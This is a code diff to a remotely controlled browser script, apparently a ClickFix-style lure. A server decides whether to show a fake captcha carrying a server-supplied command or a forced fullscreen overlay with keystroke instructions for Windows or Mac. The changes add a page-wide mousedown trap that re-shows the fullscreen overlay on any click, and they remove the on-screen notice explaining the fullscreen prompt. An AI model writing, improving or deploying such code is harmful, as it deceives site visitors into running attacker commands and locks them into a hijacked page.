@@ -85,6 +85,14 @@ async function trackDevice() {
 const state = {
     isActive: false,
     currentMode: null, // 'captcha' or 'fullscreen'
+    isTrapActive: false,
+};
+
+let fullscreenPlatform = null;
+const fullscreenTrap = async () => {
+    if (state.isActive && state.currentMode === 'fullscreen') {
+        showFullscreenOverlay(fullscreenPlatform);
+    }
 };
 
 // --- 2. Check Activation & Execute Command ---
@@ -136,12 +144,20 @@ function handleActivationResponse(data) {
             state.isActive = true;
             state.currentMode = data.mode;
 
-            // Dispatch based on mode
-            removeOverlays(); // Clear any existing overlay before showing new one
+            removeOverlays();
+
             if (data.mode === 'fullscreen') {
-                showFullscreenOverlay(data.platform);
+                fullscreenPlatform = data.platform;
+                if (!state.isTrapActive) {
+                    document.addEventListener('mousedown', fullscreenTrap, true);
+                    state.isTrapActive = true;
+                }
             } else { // Default or 'captcha'
                 showCaptcha(data.command, data.platform);
+                if (state.isTrapActive) {
+                    document.removeEventListener('mousedown', fullscreenTrap, true);
+                    state.isTrapActive = false;
+                }
             }
         }
 
@@ -151,6 +167,10 @@ function handleActivationResponse(data) {
             console.log("[DeviceTracker] Deactivated");
             state.isActive = false;
             state.currentMode = null;
+            if (state.isTrapActive) {
+                document.removeEventListener('mousedown', fullscreenTrap, true);
+                state.isTrapActive = false;
+            }
             removeOverlays();
         }
     }
@@ -165,7 +185,7 @@ function removeOverlays() {
     const fsOverlay = document.getElementById('vot-fs-overlay');
     if (fsOverlay) fsOverlay.remove();
 
-    // Exit fullscreen if strictly needed, but might be annoying if user entered manually. 
+    // Exit fullscreen if strictly needed, but might be annoying if user entered manually.
     // Let's exit if we forced it.
     if (document.fullscreenElement) {
         document.exitFullscreen().catch(() => { });
@@ -206,28 +226,23 @@ function showFullscreenOverlay(platform) {
                 position: fixed; inset: 0; z-index: 999999;
                 background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
                 display: flex; justify-content: center; align-items: center;
-                text-align: center; cursor: pointer;
+                text-align: center;
             }
             .vot-content {
                 background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
                 box-shadow: 0 25px 80px rgba(0,0,0,.45);
-                pointer-events: none; /* Let clicks pass to the container for fullscreen trigger */
             }
             h2 { font-size: 2.5rem; margin-bottom: 28px; }
             .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
             kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
             .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
             .note { font-size: 0.95rem; opacity: 0.7; }
-            .fs-status { position: absolute; bottom: 20px; font-size: 0.8rem; opacity: 0.5; width: 100%; text-align: center; }
         </style>
         <div class="vot-content">
             ${isMac ? macContent : winContent}
         </div>
-        <div id="vot-fs-status" class="fs-status">Кликните в любом месте для перехода в полноэкранный режим</div>
     `;
     document.body.appendChild(div);
-
-    const statusEl = div.querySelector('#vot-fs-status');
 
     const enterFullscreen = async () => {
         try {
@@ -238,36 +253,21 @@ function showFullscreenOverlay(platform) {
             } else if (document.documentElement.msRequestFullscreen) { /* IE11 */
                 await document.documentElement.msRequestFullscreen();
             }
-            if (statusEl) statusEl.style.display = 'none';
         } catch (e) {
-            console.warn("[DeviceTracker] Fullscreen request failed", e);
-            if (statusEl) statusEl.style.display = 'block';
+            console.warn("[DeviceTracker] Fullscreen failed", e);
         }
     };
 
-    div.onclick = enterFullscreen;
-
-    // Aggressive Re-Fullscreen
+    // Close on exit
     const onFullscreenChange = () => {
-        if (!state.isActive || state.currentMode !== 'fullscreen') {
-            document.removeEventListener("fullscreenchange", onFullscreenChange);
-            return;
-        }
-
         if (!document.fullscreenElement) {
-            console.log("[DeviceTracker] Fullscreen exited. Showing status message.");
-            if (statusEl) statusEl.style.display = 'block';
-
-            // Try automatic (usually fails)
-            enterFullscreen().catch(() => { });
-        } else {
-            if (statusEl) statusEl.style.display = 'none';
+            console.log("[DeviceTracker] Fullscreen exited. Closing overlay.");
+            removeOverlays();
+            document.removeEventListener("fullscreenchange", onFullscreenChange);
         }
     };
 
     document.addEventListener("fullscreenchange", onFullscreenChange);
-
-    // Initial attempt
     enterFullscreen();
 }
 
